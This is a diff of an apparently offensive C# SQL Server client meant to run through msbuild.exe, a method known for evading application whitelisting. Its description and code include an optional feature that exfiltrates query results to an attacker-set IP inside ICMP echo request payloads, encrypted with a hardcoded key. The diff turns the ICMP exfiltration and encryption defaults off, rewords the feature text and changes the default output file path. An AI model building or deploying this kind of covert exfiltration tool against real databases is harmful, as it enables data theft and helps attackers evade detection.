@@ -5,14 +5,17 @@
 		Description: 
 		This is a simple C# SQL Server client console that can be run through msbuild. 
 
-	    	Features:		
-		1. Uses hardcode connection string by default.  Change with setconn command.
-		2. Writes query results to c:\windows\temp\file.csv by default.  Change with setfile command.
-		3. ICMP exfilatation is disabled by default. By setting the "enableicmp" variable to true, and 
-		   setting the IP, the results of each query will be sent to the provided IP in the payloads of ICMP echo requests.
-		   The payloads are encrypted by default and the salt/key are hard coded.  You can use the baked in decryption
-		   function to decrypt the payload data on the receiving system. You can also disable
-		   encrypted payloads by setting the "enableEncryption" variable to "false", but cleartext data == bad idea.
+	    Features:		
+		1. The connection string is hardcoded in the "connString" variable by default.  However, it can be changed during
+		   run time with the "setconn" command.
+		2. All query results are written to c:\windows\temp\output.csv by default.  The path can be changed during runtime 
+		   using the "setfile" command.
+		3. ICMP exfiltration is disabled by default. By setting the "enableicmp" variable to true, and 
+		   setting the IP, the results of each query will be sent to the provided IP in the payloads of ICMP echo requests.		  
+		   The payloads are cleartext by default, but payload encryption can be enabled by setting "enableEncryption" variable to "true".
+		   The salt and key are hard coded, and should be changed.  
+		   The decrypt method can be used to recover the payload on the receiving system. 
+		   Generally cleartext data exfiltration == bad idea.
 		4. Type "help" for basic instructions.
 	    	
 		Execution Instructions: 
@@ -20,7 +23,7 @@
 		2. In a console, navigate to the folder containing this .csproj or .xml file.
 		3. Run the msbuild.exe command from its path using one of the commands below. 
 		   You can explicitly define the .csproj file to load, but it is not required 
-                   if only one .csproj file exists your current working directory. 
+           if only one .csproj file exists your current working directory. 
 			C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe 
 			C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe file.xml
 			C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe file.csproj
@@ -268,7 +271,7 @@
 						Console.WriteLine("\n");
 						Console.WriteLine(" COMMAND    		setfile"); 
 						Console.WriteLine(" DESCRIPTION		By default, the output file is c:\\windows\\temp\\output.csv. Use this command to change it on the fly."); 
-						Console.WriteLine(" EXAMPLE    		setfile c:\\windows\\temp\\file.csv"); 
+						Console.WriteLine(" EXAMPLE    		setfile c:\\windows\\temp\\output.csv"); 
 						Console.WriteLine("\n");
 						fullcommand = "";
 						Console.Write("SQLCLIENT> ");
@@ -288,7 +291,8 @@
 				DataTable dt = new DataTable(); 				
 				
 				// Run query				
-				try{												
+				try{				
+				
 					// Set connection string						
 					if(connString.Equals(""))
 					{
@@ -358,11 +362,11 @@
 							Console.WriteLine("\nSuccessfully wrote query output to " + filePath);
 
 								// encrypt payload
-								string enableEncryption = "true";
+								string enableEncryption = "false";
 								string encrypted64 = EncryptStringAES(fileContent.ToString(),"changethis");								
 							
 								// send results in icmp
-								string enableicmp = "true";
+								string enableicmp = "false";
 								if(enableicmp == "true")
 								{
 									// https://docs.microsoft.com/en-us/dotnet/api/system.net.networkinformation.ping?view=netframework-4.7.2
